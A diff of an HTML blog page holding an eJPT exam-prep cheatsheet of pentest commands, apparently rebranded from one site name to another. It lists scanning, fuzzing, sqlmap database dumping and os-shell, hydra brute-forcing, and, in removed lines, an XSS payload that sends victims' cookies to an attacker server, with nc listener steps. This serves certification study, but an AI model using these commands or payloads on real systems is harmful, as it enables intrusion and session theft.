@@ -1,422 +1,391 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    
-      <title>
-        eJPT Cheatsheet 🎓 ::
-        bhavsec — portfolio &amp; blog
-      </title>
-    
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta
-  name="description"
-  content="This post contains commands to prepare for eLearnSecurity eJPT exam.
+
+<head>
+
+  <title>
+    eJPT Cheatsheet 🎓 ::
+    hackerwasii — portfolio &amp; blog
+  </title>
+
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="This post contains commands to prepare for eLearnSecurity eJPT exam.
 nmap hosts discovery nmap:
 nmap -sn 10.10.10.0/24 &amp;gt; hosts.txt nmap -sn -T4 10.10.30.0/24 -oG - | awk &#39;/Up$/{print $2}&#39; open ports scan (save to file):
 nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open UDP port scan:
 nmap -sU -sV 10.10.10.0/24 nmap vuln scan example:
 nmap --script vuln --script-args=unsafe=1 -iL hosts.txt nmap SYN flood example:
-watch -n 10 &amp;quot;nmap -e wlan0 -Pn -T5 -S 192."
-/>
-<meta
-  name="keywords"
-  content="bhavsec, cybersecurity, penetration testing"
-/>
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://bhavsec.com/posts/ejpt-cheatsheet/" />
-
-
-
-
-
-<link rel="stylesheet" href="../../assets/style.css" />
-
-<link rel="stylesheet" href="../../style.css" />
-
-
-<link
-  rel="apple-touch-icon-precomposed"
-  sizes="144x144"
-  href="../../img/apple-touch-icon-144-precomposed.png"
-/>
-<link rel="shortcut icon" href="../../img/favicon.png" />
-
-
-<link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-
-
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://bhavsec.com/img/cover.png"/>
-
-<meta name="twitter:title" content="eJPT Cheatsheet 🎓"/>
-<meta name="twitter:description" content="This post contains commands to prepare for eLearnSecurity eJPT exam.
-nmap hosts discovery nmap:
-nmap -sn 10.10.10.0/24 &gt; hosts.txt nmap -sn -T4 10.10.30.0/24 -oG - | awk &#39;/Up$/{print $2}&#39; open ports scan (save to file):
-nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open UDP port scan:
-nmap -sU -sV 10.10.10.0/24 nmap vuln scan example:
-nmap --script vuln --script-args=unsafe=1 -iL hosts.txt nmap SYN flood example:
-watch -n 10 &quot;nmap -e wlan0 -Pn -T5 -S 192."/>
-
-
-
-<meta property="og:title" content="eJPT Cheatsheet 🎓" />
-<meta property="og:description" content="This post contains commands to prepare for eLearnSecurity eJPT exam.
+watch -n 10 &amp;quot;nmap -e wlan0 -Pn -T5 -S 192." />
+  <meta name="keywords" content="hackerwasii, cybersecurity, penetration testing" />
+  <meta name="robots" content="noodp" />
+  <link rel="canonical" href="https://www.hackerwasii.com/posts/ejpt-cheatsheet/" />
+  <link rel="stylesheet" href="../../assets/style.css" />
+  <link rel="stylesheet" href="../../style.css" />
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../../img/apple-touch-icon-144-precomposed.png" />
+  <link rel="shortcut icon" href="../../img/favicon.png" />
+  <link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://www.hackerwasii.com/img/cover.png" />
+  <meta name="twitter:title" content="eJPT Cheatsheet 🎓" />
+  <meta name="twitter:description" content="This post contains commands to prepare for eLearnSecurity eJPT exam.
 nmap hosts discovery nmap:
 nmap -sn 10.10.10.0/24 &gt; hosts.txt nmap -sn -T4 10.10.30.0/24 -oG - | awk &#39;/Up$/{print $2}&#39; open ports scan (save to file):
 nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open UDP port scan:
 nmap -sU -sV 10.10.10.0/24 nmap vuln scan example:
 nmap --script vuln --script-args=unsafe=1 -iL hosts.txt nmap SYN flood example:
 watch -n 10 &quot;nmap -e wlan0 -Pn -T5 -S 192." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://bhavsec.com/posts/ejpt-cheatsheet/" /><meta property="og:image" content="https://bhavsec.com/img/cover.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-01-30T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2022-01-30T00:00:00&#43;00:00" /><meta property="og:site_name" content="bhavsec" />
+  <meta property="og:title" content="eJPT Cheatsheet 🎓" />
+  <meta property="og:description" content="This post contains commands to prepare for eLearnSecurity eJPT exam.
+nmap hosts discovery nmap:
+nmap -sn 10.10.10.0/24 &gt; hosts.txt nmap -sn -T4 10.10.30.0/24 -oG - | awk &#39;/Up$/{print $2}&#39; open ports scan (save to file):
+nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open UDP port scan:
+nmap -sU -sV 10.10.10.0/24 nmap vuln scan example:
+nmap --script vuln --script-args=unsafe=1 -iL hosts.txt nmap SYN flood example:
+watch -n 10 &quot;nmap -e wlan0 -Pn -T5 -S 192." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://www.hackerwasii.com/posts/ejpt-cheatsheet/" />
+  <meta property="og:image" content="https://www.hackerwasii.com/img/cover.png" />
+  <meta property="article:section" content="posts" />
+  <meta property="article:published_time" content="2022-01-30T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2022-01-30T00:00:00&#43;00:00" />
+  <meta property="og:site_name" content="hackerwasii" />
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0PCVFG8BNK"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
 
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
 
+    gtag('config', 'G-0PCVFG8BNK');
+  </script>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9670252621494000"
+    crossorigin="anonymous"></script>
+</head>
 
+<body class="">
+  <div class="container">
+    <header class="header">
+      <span class="header__inner">
+        <a href="https://www.hackerwasii.com/" class="logo" style="text-decoration: none;">
 
+          <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+              <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+            </svg>
+          </span>
+          <span class="logo__text">
+            wasii/</span>
+          <span class="logo__text" style="color:red">posts/</span>
+          <span class="logo__cursor"></span>
+        </a>
+        <span class="header__right">
+          <nav class="menu">
+            <ul class="menu__inner menu__inner--desktop">
+              <li><a href="../../resume">📄 resume</a></li>
+              <li><a href="../../posts">📚 blog</a></li>
+              <li><a href="../../whoami">🔎 whoami </a></li>
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+            <ul class="menu__inner menu__inner--mobile">
+              <li><a href="../../resume">📄 resume</a></li>
+              <li><a href="../../posts">📚 blog</a></li>
+              <li><a href="../../whoami">🔎 whoami </a></li>
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+          </nav>
 
+          <span class="menu-trigger">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <path d="M0 0h24v24H0z" fill="none" />
+              <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+            </svg>
+          </span>
 
-
-  </head>
-  <body class="">
-    <div class="container">
-      <header class="header">
-  <span class="header__inner">
-    <a
-  href="http://bhavsec.com/"
-  class="logo"
-  style="text-decoration: none;"
->
-  
-    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-</svg>
-</span>
-    <span class="logo__text">
-      bhavsec/</span>
-    <span class="logo__text" style="color:red">posts/</span>
-    <span class="logo__cursor"></span>
-
-  
-</a>
-
-    <span class="header__right">
-      
-        <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-        
-          <li><a href="../../resume">📄 resume</a></li>
-        
-      
-        
-          <li><a href="../../posts">📚 blog</a></li>
-        
-      
-        
-          <li><a href="../../whoami">🔎 whoami </a></li>
-        
-      
-        
-          <li><a href="../../resources">🚀 resources</a></li>
-        
-      
-      
-      
-  </ul>
-
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="../../resume">📄 resume</a></li>
-      
-    
-      
-        <li><a href="../../posts">📚 blog</a></li>
-      
-    
-      
-        <li><a href="../../whoami">🔎 whoami </a></li>
-      
-    
-      
-        <li><a href="../../resources">🚀 resources</a></li>
-      
-    
-  </ul>
-</nav>
-
-        <span class="menu-trigger">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-            <path d="M0 0h24v24H0z" fill="none" />
-            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
-          </svg>
-        </span>
-      
-      <span class="theme-toggle">
-        <svg
-  class="theme-toggler"
-  width="24"
-  height="24"
-  viewBox="0 0 48 48"
-  fill="none"
-  xmlns="http://www.w3.org/2000/svg"
->
-  <path
-    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+          <span class="theme-toggle">
+            <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"
+              xmlns="http://www.w3.org/2000/svg">
+              <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
-  />
-</svg>
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z" />
+            </svg>
 
-      </span>
-    </span>
-  </span>
-</header>
-
-
-      <div class="content">
-        
-  
-  
-
-  <div class="post">
-    <h1 class="post-title">eJPT Cheatsheet 🎓</h1>
-    <div class="post-meta">
-      
-        <span class="post-date">
-          2022-01-30
+          </span>
         </span>
-
-        
-          
-        
-      
-
-      
-
-
-      
-    </div>
-
-    
-      <span class="post-tags">
-        
-          <a href="../../tags/certification/index.html">#certification</a>&nbsp;
-        
-          <a href="../../tags/career/index.html">#career</a>&nbsp;
-        
-          <a href="../../tags/infosec/index.html">#infosec</a>&nbsp;
-        
-          <a href="../../tags/exploitation/index.html">#exploitation</a>&nbsp;
-        
       </span>
-    
+    </header>
 
-    
+    <div class="content">
+      <div class="post">
+        <h1 class="post-title">eJPT Cheatsheet 🎓</h1>
+        <div class="post-meta">
 
-    <div class="post-content">
-      
-        
-        <h2>Table of Contents</h2>
-        <aside class="table-of-contents"><nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="index.html#nmap">nmap</a></li>
-        <li><a href="index.html#spotting-a-firewall">spotting a firewall</a></li>
-        <li><a href="index.html#masscan">masscan</a></li>
-        <li><a href="index.html#httprint">httprint</a></li>
-        <li><a href="index.html#route">route</a></li>
-        <li><a href="index.html#subdomains">subdomains</a></li>
-        <li><a href="index.html#wireshark">wireshark</a></li>
-        <li><a href="index.html#web-app-enumeration-gobuster">web app enumeration (gobuster)</a></li>
-        <li><a href="index.html#webapp-enum-ffuf">webapp enum (ffuf)</a></li>
-        <li><a href="index.html#sqlmap">sqlmap</a></li>
-        <li><a href="index.html#xss">xss</a></li>
-        <li><a href="index.html#bruteforce-hydra-john-hashcat">bruteforce (hydra, john, hashcat)</a></li>
-        <li><a href="index.html#wpscan">wpscan</a></li>
-        <li><a href="index.html#mysql">mysql</a></li>
-        <li><a href="index.html#msfconsole">msfconsole</a></li>
-        <li><a href="index.html#meterpreter">meterpreter</a></li>
-        <li><a href="index.html#windows-shares">windows shares</a></li>
-        <li><a href="index.html#arp-spoofing">ARP spoofing</a></li>
-        <li><a href="index.html#reverse-shell">reverse shell</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav></aside>
-        
-      
-      <p>This post contains commands to prepare for eLearnSecurity eJPT exam.</p>
-<h3 id="nmap">nmap</h3>
-<p>hosts discovery nmap:</p>
-<pre><code>nmap -sn 10.10.10.0/24 &gt; hosts.txt
+          <span class="post-date">
+            2022-01-30
+          </span>
+        </div>
+        <span class="post-tags">
+          <a href="../../tags/certification/index.html">#certification</a>&nbsp;
+          <a href="../../tags/career/index.html">#career</a>&nbsp;
+          <a href="../../tags/infosec/index.html">#infosec</a>&nbsp;
+          <a href="../../tags/exploitation/index.html">#exploitation</a>&nbsp;
+        </span>
+        <div class="post-content">
+          <h2>Table of Contents</h2>
+          <aside class="table-of-contents">
+            <nav id="TableOfContents">
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="index.html#nmap">nmap</a></li>
+                    <li><a href="index.html#spotting-a-firewall">spotting a firewall</a></li>
+                    <li><a href="index.html#masscan">masscan</a></li>
+                    <li><a href="index.html#httprint">httprint</a></li>
+                    <li><a href="index.html#route">route</a></li>
+                    <li><a href="index.html#subdomains">subdomains</a></li>
+                    <li><a href="index.html#wireshark">wireshark</a></li>
+                    <li><a href="index.html#web-app-enumeration-gobuster">web app enumeration (gobuster)</a></li>
+                    <li><a href="index.html#webapp-enum-ffuf">webapp enum (ffuf)</a></li>
+                    <li><a href="index.html#sqlmap">sqlmap</a></li>
+                    <li><a href="index.html#xss">xss</a></li>
+                    <li><a href="index.html#bruteforce-hydra-john-hashcat">bruteforce (hydra, john, hashcat)</a></li>
+                    <li><a href="index.html#wpscan">wpscan</a></li>
+                    <li><a href="index.html#mysql">mysql</a></li>
+                    <li><a href="index.html#msfconsole">msfconsole</a></li>
+                    <li><a href="index.html#meterpreter">meterpreter</a></li>
+                    <li><a href="index.html#windows-shares">windows shares</a></li>
+                    <li><a href="index.html#arp-spoofing">ARP spoofing</a></li>
+                    <li><a href="index.html#reverse-shell">reverse shell</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </nav>
+          </aside>
+          <p>This post contains commands to prepare for eLearnSecurity eJPT exam.</p>
+          <h3 id="nmap">nmap</h3>
+          <p>hosts discovery nmap:</p>
+          <pre><code>nmap -sn 10.10.10.0/24 &gt; hosts.txt
 nmap -sn -T4 10.10.30.0/24 -oG - | awk '/Up$/{print $2}'
-</code></pre><p>open ports scan (save to file):</p>
-<pre><code>nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open
-</code></pre><p>UDP port scan:</p>
-<pre><code>nmap -sU -sV 10.10.10.0/24
-</code></pre><p>nmap vuln scan example:</p>
-<pre><code>nmap --script vuln --script-args=unsafe=1 -iL hosts.txt
-</code></pre><p>nmap SYN flood example:</p>
-<pre><code>watch -n 10 &quot;nmap -e wlan0 -Pn -T5 -S 192.168.0.253 192.168.0.251&quot;
-</code></pre><h3 id="spotting-a-firewall">spotting a firewall</h3>
-<p>If an nmap TCP scan identified a well-known service, such as a web server, but
-cannot detect the version, then there may be a firewall in place.</p>
-<p>For example:</p>
-<pre><code>PORT    STATE  SERVICE  REASON          VERSION
+</code></pre>
+          <p>open ports scan (save to file):</p>
+          <pre><code>nmap -Pn -sV -T4 -A -oN ports.txt -p- -iL hosts.txt --open
+</code></pre>
+          <p>UDP port scan:</p>
+          <pre><code>nmap -sU -sV 10.10.10.0/24
+</code></pre>
+          <p>nmap vuln scan example:</p>
+          <pre><code>nmap --script vuln --script-args=unsafe=1 -iL hosts.txt
+</code></pre>
+          <p>nmap SYN flood example:</p>
+          <pre><code>watch -n 10 &quot;nmap -e wlan0 -Pn -T5 -S 192.168.0.253 192.168.0.251&quot;
+</code></pre>
+          <h3 id="spotting-a-firewall">spotting a firewall</h3>
+          <p>If an nmap TCP scan identified a well-known service, such as a web server, but
+            cannot detect the version, then there may be a firewall in place.</p>
+          <p>For example:</p>
+          <pre><code>PORT    STATE  SERVICE  REASON          VERSION
 80/tcp  open   http?    syn-ack ttl 64
-</code></pre><p>Another example:</p>
-<pre><code>80/tcp  open   tcpwrapped 
-</code></pre><p><strong>&ldquo;tcpwrapped&rdquo;</strong> means the TCP handshake was completed, but the remote host
-closed the connection without receiving any data.</p>
-<p>These are both indicators that a firewall is blocking our scan with the target!</p>
-<p>Tips:</p>
-<ul>
-<li>Use &ldquo;&ndash;reason&rdquo; to see why a port is marked open or closed</li>
-<li>If a &ldquo;RST&rdquo; packet is received, then something prevented the connection - probably a firewall!</li>
-</ul>
-<h3 id="masscan">masscan</h3>
-<p>masscan open only examples:</p>
-<pre><code>sudo masscan -p 21,22,80,8080,445,9200 --rate 64000 --wait 0 --open-only -oG masscan.gnmap 10.0.0.0/24
+</code></pre>
+          <p>Another example:</p>
+          <pre><code>80/tcp  open   tcpwrapped 
+</code></pre>
+          <p><strong>&ldquo;tcpwrapped&rdquo;</strong> means the TCP handshake was completed, but the remote host
+            closed the connection without receiving any data.</p>
+          <p>These are both indicators that a firewall is blocking our scan with the target!</p>
+          <p>Tips:</p>
+          <ul>
+            <li>Use &ldquo;&ndash;reason&rdquo; to see why a port is marked open or closed</li>
+            <li>If a &ldquo;RST&rdquo; packet is received, then something prevented the connection - probably a
+              firewall!</li>
+          </ul>
+          <h3 id="masscan">masscan</h3>
+          <p>masscan open only examples:</p>
+          <pre><code>sudo masscan -p 21,22,80,8080,445,9200 --rate 64000 --wait 0 --open-only -oG masscan.gnmap 10.0.0.0/24
 sudo masscan -iL hosts.list -p0-65535 --rate 64000 --open-only
-</code></pre><h3 id="httprint">httprint</h3>
-<p>httprint banner grabling:</p>
-<pre><code>httprint -P0 -s /usr/share/httprint/signatures.txt -h 10.10.10.15
-</code></pre><h3 id="route">route</h3>
-<p>add a route linux:</p>
-<pre><code>ip route add 192.168.88.0/24 via 10.10.34.1
-</code></pre><p>routing table:</p>
-<pre><code>netstat -rn
+</code></pre>
+          <h3 id="httprint">httprint</h3>
+          <p>httprint banner grabling:</p>
+          <pre><code>httprint -P0 -s /usr/share/httprint/signatures.txt -h 10.10.10.15
+</code></pre>
+          <h3 id="route">route</h3>
+          <p>add a route linux:</p>
+          <pre><code>ip route add 192.168.88.0/24 via 10.10.34.1
+</code></pre>
+          <p>routing table:</p>
+          <pre><code>netstat -rn
 Kernel IP routing table
 Destination      Gateway        Genmask         Flags   MSS Window  irtt Iface
 ...
 192.168.88.0     10.10.34.1     255.255.255.0   UG        0 0          0 tap0
 ...
-</code></pre><h3 id="subdomains">subdomains</h3>
-<p>discovery subdomain of a target by sublist3r:</p>
-<pre><code>sublist3r -d company.com
-</code></pre><h3 id="wireshark">wireshark</h3>
-<p>filter by ip</p>
-<pre><code>ip.add == 10.10.10.9
-</code></pre><p>filter by dest ip</p>
-<pre><code>ip.dest == 10.10.10.15
-</code></pre><p>filter by source ip</p>
-<pre><code>ip.src == 10.10.16.33
-</code></pre><p>filter by tcp port</p>
-<pre><code>tcp.port == 25
-</code></pre><p>filter by ip addr and port</p>
-<pre><code>ip.addr == 10.10.14.22 and tcp.port == 8080
-</code></pre><p>filter SYN flag</p>
-<pre><code>tcp.flags.syn == 1 and tcp.flags.ack ==0
-</code></pre><p>broadcast filter</p>
-<pre><code>eth.dst == ff:ff:ff:ff:ff:ff
-</code></pre><h3 id="web-app-enumeration-gobuster">web app enumeration (gobuster)</h3>
-<p>fuzz directories</p>
-<pre><code>gobuster dir -u http://example.com -w /usr/share/wordlists/rockyou.txt
-</code></pre><p>fuzz files</p>
-<pre><code>gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o output.txt
-</code></pre><h3 id="webapp-enum-ffuf">webapp enum (ffuf)</h3>
-<p>directory discovery:</p>
-<pre><code>ffuf -w wordlist.txt -u http://example.com/FUZZ
-</code></pre><p>file discovery:</p>
-<pre><code>ffuf -w wordlist.txt -u http://example.com/FUZZ -e .aspx,.php,.txt,.html
-</code></pre><p>output of responses with status code:</p>
-<pre><code>ffuf -w /usr/share/wordlists/dirb/small.txt -u http://example.com/FUZZ -mc 200,301
-</code></pre><p>the -maxtime flag offers to end the ongoing fuzzing after the specified time in seconds:</p>
-<pre><code>ffuf -w wordlist.txt -u http://example.com/FUZZ -maxtime 60
-</code></pre><p>number of threads:</p>
-<pre><code>ffuf -w wordlist.txt -u http://example.com/FUZZ -t 64
-</code></pre><h3 id="sqlmap">sqlmap</h3>
-<p>determine the databases:</p>
-<pre><code>sqlmap -u http://10.10.10.15/?id=4 --dbs
-</code></pre><p>determine the tables:</p>
-<pre><code>sqlmap -u http://10.10.10.15/?id=4 -D dbname --tables
-</code></pre><p>if tables not available, guess tables using common names</p>
-<pre><code>sqlmap -u http://10.10.10.15/?id=4 -D dbname --common-tables
-</code></pre><p>dump a table&rsquo;s data:</p>
-<pre><code>sqlmap -u http://10.10.10.15/?id=4 -D dbname -T table --dump
-</code></pre><p>try to get os-shell:</p>
-<pre><code>sqlmap -u http://10.10.10.15/?id=4 --os-shell
-</code></pre><h3 id="xss">xss</h3>
-<p>check example:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;hack :)&#34;</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
-</code></pre></div><h4 id="hijack-cookie-through-xss">hijack cookie through xss</h4>
-<p>there are four components as follows:</p>
-<ul>
-<li>attacker client pc</li>
-<li>attacker logging server</li>
-<li>vulnerable server</li>
-<li>victim client pc</li>
-</ul>
-<ol>
-<li>
-<p>attacker: first finds a vulnerable server and its breach point.</p>
-</li>
-<li>
-<p>attacker: enter the following snippet in order to hijack the cookie kepts by victim client pc (p.s.: the ip address, 192.168.99.102, belongs to attacker logging server in this example):</p>
-</li>
-</ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>();<span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://192.168.99.102/log.php?q=&#34;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
-</code></pre></div><ol start="3">
-<li>attacker: log into attacker logging server (P.S.: it is 192.168.99.102 in this example), and execute the following command:</li>
-</ol>
-<pre><code>nc -vv -k -l -p 80
-</code></pre><ol start="4">
-<li>
-<p>attacker: when victim client pc browses the vulnerable server, check the output of the command above.</p>
-</li>
-<li>
-<p>attacker: after obtaining the victim&rsquo;s cookie, utilize a firefox&rsquo;s add-on called Cookie Quick Manager to change to the victim&rsquo;s cookie in an effort to hijack the victim&rsquo;s privilege.</p>
-</li>
-</ol>
-<h3 id="bruteforce-hydra-john-hashcat">bruteforce (hydra, john, hashcat)</h3>
-<p>wordlist generation</p>
-<pre><code>cewl example.com -m 3 -w wordlist.txt
-</code></pre><p>hydra http basic auth brute</p>
-<pre><code>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/
-</code></pre><p>hydra brute http digest</p>
-<pre><code>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/
-</code></pre><p>hydra brute http post form</p>
-<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^&amp;login=Login:Not allowed&quot;
-</code></pre><p>hydra brute http authenticated post form</p>
-<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^&amp;login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v&quot;
-</code></pre><p>hydra brute</p>
-<pre><code>hydra -f -v -V -L users.txt -P rockyou-15.txt -s 2223 -f ssh://10.10.10.17
+</code></pre>
+          <h3 id="subdomains">subdomains</h3>
+          <p>discovery subdomain of a target by sublist3r:</p>
+          <pre><code>sublist3r -d company.com
+</code></pre>
+          <h3 id="wireshark">wireshark</h3>
+          <p>filter by ip</p>
+          <pre><code>ip.add == 10.10.10.9
+</code></pre>
+          <p>filter by dest ip</p>
+          <pre><code>ip.dest == 10.10.10.15
+</code></pre>
+          <p>filter by source ip</p>
+          <pre><code>ip.src == 10.10.16.33
+</code></pre>
+          <p>filter by tcp port</p>
+          <pre><code>tcp.port == 25
+</code></pre>
+          <p>filter by ip addr and port</p>
+          <pre><code>ip.addr == 10.10.14.22 and tcp.port == 8080
+</code></pre>
+          <p>filter SYN flag</p>
+          <pre><code>tcp.flags.syn == 1 and tcp.flags.ack ==0
+</code></pre>
+          <p>broadcast filter</p>
+          <pre><code>eth.dst == ff:ff:ff:ff:ff:ff
+</code></pre>
+          <h3 id="web-app-enumeration-gobuster">web app enumeration (gobuster)</h3>
+          <p>fuzz directories</p>
+          <pre><code>gobuster dir -u http://example.com -w /usr/share/wordlists/rockyou.txt
+</code></pre>
+          <p>fuzz files</p>
+          <pre><code>gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -o output.txt
+</code></pre>
+          <h3 id="webapp-enum-ffuf">webapp enum (ffuf)</h3>
+          <p>directory discovery:</p>
+          <pre><code>ffuf -w wordlist.txt -u http://example.com/FUZZ
+</code></pre>
+          <p>file discovery:</p>
+          <pre><code>ffuf -w wordlist.txt -u http://example.com/FUZZ -e .aspx,.php,.txt,.html
+</code></pre>
+          <p>output of responses with status code:</p>
+          <pre><code>ffuf -w /usr/share/wordlists/dirb/small.txt -u http://example.com/FUZZ -mc 200,301
+</code></pre>
+          <p>the -maxtime flag offers to end the ongoing fuzzing after the specified time in seconds:</p>
+          <pre><code>ffuf -w wordlist.txt -u http://example.com/FUZZ -maxtime 60
+</code></pre>
+          <p>number of threads:</p>
+          <pre><code>ffuf -w wordlist.txt -u http://example.com/FUZZ -t 64
+</code></pre>
+          <h3 id="sqlmap">sqlmap</h3>
+          <p>determine the databases:</p>
+          <pre><code>sqlmap -u http://10.10.10.15/?id=4 --dbs
+</code></pre>
+          <p>determine the tables:</p>
+          <pre><code>sqlmap -u http://10.10.10.15/?id=4 -D dbname --tables
+</code></pre>
+          <p>if tables not available, guess tables using common names</p>
+          <pre><code>sqlmap -u http://10.10.10.15/?id=4 -D dbname --common-tables
+</code></pre>
+          <p>dump a table&rsquo;s data:</p>
+          <pre><code>sqlmap -u http://10.10.10.15/?id=4 -D dbname -T table --dump
+</code></pre>
+          <p>try to get os-shell:</p>
+          <pre><code>sqlmap -u http://10.10.10.15/?id=4 --os-shell
+</code></pre>
+          <h3 id="xss">xss</h3>
+          <p>check example:</p>
+          <div class="highlight">
+            <pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;hack :)&#34;</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre>
+          </div>
+          <h4 id="hijack-cookie-through-xss">hijack cookie through xss</h4>
+          <p>there are four components as follows:</p>
+          <ul>
+            <li>attacker client pc</li>
+            <li>attacker logging server</li>
+            <li>vulnerable server</li>
+            <li>victim client pc</li>
+          </ul>
+          <ol>
+            <li>
+              <p>attacker: first finds a vulnerable server and its breach point.</p>
+            </li>
+            <li>
+              <p>attacker: enter the following snippet in order to hijack the cookie kepts by victim client pc (p.s.:
+                the ip address, 192.168.99.102, belongs to attacker logging server in this example):</p>
+            </li>
+          </ol>
+          <div class="highlight">
